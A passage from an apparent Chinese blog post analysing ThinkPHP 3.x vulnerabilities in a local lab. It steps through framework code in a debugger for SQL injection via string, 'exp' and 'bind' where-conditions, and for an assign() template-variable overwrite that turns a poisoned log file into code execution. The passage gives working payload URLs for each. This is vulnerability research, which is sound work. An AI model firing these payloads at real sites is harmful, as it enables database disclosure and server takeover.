alt=\"在这里插入图片描述\"><br>这些就是一些查询语句，然后将结果返回，接下来到最后<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549656.png\" alt=\"在这里插入图片描述\"><br>这里进入<code>parseWhere</code>方法<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549795.png\" alt=\"在这里插入图片描述\"></p>\n<p>我们这里的<code>$where</code>是字符串，所以走if语句，将<code>$where</code>的值赋给<code>$whereStr</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549926.png\" alt=\"在这里插入图片描述\"><br>可以看到这里是直接返回了<code>$whereStr</code>，没有用过滤函数什么的处理，因此最终返回的仍是我们传入的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549113.png\" alt=\"在这里插入图片描述\"><br>具体<code>SQL</code>内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> <span class=\"token string backtick-quoted-string\">`users`</span> <span class=\"token constant\">WHERE</span> <span class=\"token number\">0</span> union select <span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token constant\">LIMIT</span> <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"exp注入\"><a href=\"#exp注入\" class=\"headerlink\" title=\"exp注入\"></a>exp注入</h3><p>测试这个的话需要简单修改一下我们的<code>select()</code>方法，修改后内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">select</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$map</span> <span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'users'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">where</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$map</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549142.png\" alt=\"在这里插入图片描述\"><br>这里需要说明一下，之所以不用<code>I方法</code>，是因为<code>I方法</code>中存在过滤，即<code>think_filter</code>函数，其内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$value</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>可以看出这里过滤了<code>exp</code>，所以不能直接用<code>I</code>方法来写，接下来我们访问网页，写入如下payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php/home/index/select?id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>同时开启调试,单步跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549288.png\" alt=\"在这里插入图片描述\"><br>这里的话我们的<code>where</code>是数组，所以条件不满足，直接pass，第二个if同理，然后第三个的话，我们这里并未对<code>optinos[where]</code>进行赋值，所以就会走<code>else</code>，把<code>$where</code>的值赋给他，接着看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549334.png\" alt=\"在这里插入图片描述\"><br>到<code>find</code>方法这里，第一个if语句，我们这里<code>$options</code>为数组，所以直接pass，第二个if语句，我们的<code>$pk</code>值为<code>id</code>，而非数组，所以也pass，到下面跟之前一样，参数被函数<code>_parseOptions</code>包裹，接下来跟进这个函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549348.png\" alt=\"在这里插入图片描述\"><br>这里有一个字段类型验证的，我们可以看到这个是满足条件的，所以他会进入下面这个函数，我们首先这个语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_scalar</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里的<code>is_scalar</code>是检验变量是否为标量，什么是标量，官方文档如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549386.png\" alt=\"在这里插入图片描述\">我们这里的<code>$val</code>变量值如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549544.png\" alt=\"在这里插入图片描述\"><br>是<code>Array</code>，因此不会进入这个if语句，即不会进入<code>_parseType</code>方法，这里直接pass，接着看下面<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549703.png\" alt=\"在这里插入图片描述\"><br>第一个是执行查询语句返回结果的，第二个是返回预编译的语句，继续跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549888.png\" alt=\"在这里插入图片描述\"><br>我们这里用了<code>where</code>，跟进<code>parseWhere</code>方法<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549977.png\" alt=\"在这里插入图片描述\"><br>可以看到这里是拼接,继续往下看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549917.png\" alt=\"在这里插入图片描述\"><br>最终返回的是拼接的结果，接下来走到最后，得到SQL语句<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549005.png\" alt=\"在这里插入图片描述\"><br>如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> <span class=\"token string backtick-quoted-string\">`users`</span> <span class=\"token constant\">WHERE</span> <span class=\"token string backtick-quoted-string\">`id`</span> <span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> <span class=\"token function\">updatexml</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token constant\">LIMIT</span> <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"bind注入\"><a href=\"#bind注入\" class=\"headerlink\" title=\"bind注入\"></a>bind注入</h3><p>更改内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">select</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token variable\">$User</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"users\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$user</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$valu</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$User</span><span class=\"token operator\">-></span><span class=\"token function\">where</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$valu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/index.php/home/index/select?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;passwd=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来开启<code>xdebug</code>,然后访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549048.png\" alt=\"在这里插入图片描述\"><br>这里与之前相同，因为是数组，所以让前三个if语句，直接到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">options</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'where'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里，因为没有设置这个<code>options[&#39;where&#39;]</code>，所以走下面，将<code>$where</code>的值赋给他，然后将值返回，接下来继续看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549331.png\" alt=\"在这里插入图片描述\"><br>我们这里的<code>data</code>是一个数组，是有值的，所以</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个不满足条件，直接看下面，可以看到这里有<code>_facade</code>对data进行了处理，跟进这个函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549613.png\" alt=\"在这里插入图片描述\"><br>可以看到这里先是检验了是否有<code>fields</code>是否为空，然后进入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">options</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'field'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>因为这里并不存在<code>options[&#39;field&#39;]</code>，所以直接pass，走else那里，即将<code>fields</code>值赋给这里的<code>fields</code>，接下来是foreach语句<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549466.png\" alt=\"在这里插入图片描述\"><br>因为<code>$data</code>中的<code>passwd</code>在<code>fields</code>中，所以走下面，即<code>elseif</code>那里<br>这里的<code>$var</code>为<code>1</code>是标量，所以满足条件，接下来<code>data</code>被<code>_parseType</code>函数处理，跟进这个函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549626.png\" alt=\"在这里插入图片描述\"><br>可以发现这里就是对内容进行了<code>intval</code>处理，没什么影响，继续跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549544.png\" alt=\"在这里插入图片描述\"><br>这里的话是使用了<code>filter</code>函数对内容进行了一次过滤，跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549670.png\" alt=\"在这里插入图片描述\"><br>接下来到<code>_parseOptions</code>函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549911.png\" alt=\"在这里插入图片描述\"><br>接下来这里以为<code>$val</code>是数组，使用不会进入<code>_parseType</code>方法，出来该方法后，到这里<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549968.png\" alt=\"在这里插入图片描述\"><br>跟进<code>update</code>方法<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549026.png\" alt=\"在这里插入图片描述\"><br>发现有<code>parseSet</code>方法，跟进此方法<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549127.png\" alt=\"在这里插入图片描述\"><br>可以看到这里拼接了<code>=:</code>，此时的SQL语句为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">UPDATE</span> <span class=\"token string backtick-quoted-string\">`users`</span> <span class=\"token constant\">SET</span> <span class=\"token string backtick-quoted-string\">`passwd`</span><span class=\"token operator\">=</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来进入<code>parseWhereItem</code>方法<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549180.png\" alt=\"在这里插入图片描述\"><br>这里可以看出当<code>$exp=bind</code>时，<code>$whereStr</code>是可控的，而后得到拼接后的语句，此时的SQL</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\"UPDATE `users` SET `passwd`=:0 WHERE `id` = :0 and updatexml(1,concat(0x7e,user(),0x7e),1)\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来到<code>execute</code>执行函数这里<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549253.png\" alt=\"在这里插入图片描述\"><br>重点在于这里</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bind</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$that</span>   <span class=\"token operator\">=</span>   <span class=\"token variable\">$this</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">queryStr</span> <span class=\"token operator\">=</span>   <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">queryStr</span><span class=\"token punctuation\">,</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">use</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$that</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">'\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$that</span><span class=\"token operator\">-></span><span class=\"token function\">escapeString</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\''</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bind</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个<code>strtr</code>函数在这里的话就是起到替换作用，比如我们这里，我们传入的是<code>0</code>(payload中的id[1]=0)，那么这里就会拼接变成<code>:0</code>，而这个<code>strtr</code>函数将其替换为1<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549371.png\" alt=\"在这里插入图片描述\"><br>此时也就得到了我们最终的SQL语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\"UPDATE `users` SET `passwd`='1' WHERE `id` = '1' and updatexml(1,concat(0x7e,user(),0x7e),1)\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><h3 id=\"环境搭建-1\"><a href=\"#环境搭建-1\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>环境配置，我们首先需要在<code>\\Application\\Home\\Controller\\</code>新建一个文件，用之前SQL注入的亦可，这里就用之前的了，修改文件内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">Home<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">Think<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Controller</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span>  <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">display</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549429.png\" alt=\"在这里插入图片描述\"><br>因为该漏洞利用的assign函数需要模板渲染，所以需要新建一个模板文件，模板文件位置如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ThinkPHP\\Application\\Home\\View\\Index\\index<span class=\"token operator\">.</span>html <span class=\"token comment\">#内容随意</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里还需要说明的是，日志和debug的关系</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>若开启debug模式日志会到：\\Application\\Runtime\\Logs\\Home\\下<br>若未开启debug模式日志会到：\\Application\\Runtime\\Logs\\Common\\下</p></blockquote>\n<p>接下来开始复现一下，首先我们创建log文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">/ThinkPHP/index.php?m=--><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来去包含log文件(这里log的文件名与年月日相关)</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/ThinkPHP/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/23_01_18.log</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549598.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"漏洞分析-1\"><a href=\"#漏洞分析-1\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h3><p>这里之所以存在漏洞，其原因是</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>由于在业务代码中如果对模板赋值方法assign的第一个参数可控，则导致模板路径变量被覆盖为携带攻击代码路径，造成文件包含，代码执行等危害。</p></blockquote>\n<p>接下来我们在函数处打上断点<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549687.png\" alt=\"在这里插入图片描述\"><br>而后访问</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/ThinkPHP/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/23_01_18.log</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>开始单步调试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549739.png\" alt=\"在这里插入图片描述\"><br>首先来到这个<code>assign</code>函数，这里的<code>name</code>是数组，其内容为<code>我们的日志文件</code>，可以看到这个函数里用了另一个<code>assign</code>函数来处理变量，跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549810.png\" alt=\"在这里插入图片描述\"><br>这里判断<code>$name</code>是否为数组，我们的<code>$name</code>为数组，所以进入if语句，这里的<code>array_merge</code>是合并数组的，但这里<code>$this-&gt;tvar</code><br>为空，所以这里的话其实就是<code>$this-&gt;tVar=$name</code>，即将name变量的值赋给了<code>$tVar</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549828.png\" alt=\"在这里插入图片描述\"><br>继续跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549017.png\" alt=\"在这里插入图片描述\"><br>接下来到<code>display</code>函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549080.png\" alt=\"在这里插入图片描述\"><br>同上个相似，这里是用了另一个同名函数来处理变量，跟进<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141549139.png\" alt=\"在这里插入图片描述\"><br>我们这里模板内容为空，看到这里有fetch函数，跟进<img 